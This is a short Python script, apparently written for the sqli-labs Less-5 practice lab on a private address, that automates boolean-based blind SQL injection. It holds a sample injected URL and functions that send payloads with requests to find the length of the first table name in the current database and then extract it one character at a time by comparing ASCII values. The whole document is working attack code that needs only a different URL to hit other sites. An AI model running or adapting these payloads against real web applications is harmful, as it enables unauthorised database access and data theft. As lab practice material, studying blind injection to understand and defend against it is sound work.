'''
http://192.168.3.15/sqlib/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101%23
'''


import requests

url='http://192.168.3.15/sqlib/Less-5/?id=1'


def sqlin(sql,i):
    result = requests.get(sql)
    if 'You are in' in result.text:
        return(i)
    else:
        print(sql)


def get_length():
    for i in range(1,50):
        payload = '\' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)={0}%23'.format(i)
        data = sqlin(url+payload,i)
        if data:
            print('length is:',i)
            return data


def get_data(loca):
    for i in range(65,123):
        payload = '\' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))={1}%23'.format(loca,i)
        result = sqlin(url+payload,i)
        if result:
            print(chr(result))
            return chr(result)



if __name__ == '__main__':
    data = ''
    length = get_length()
    for i in range(1,length+1):
        data +=  get_data(i)
        print(data)

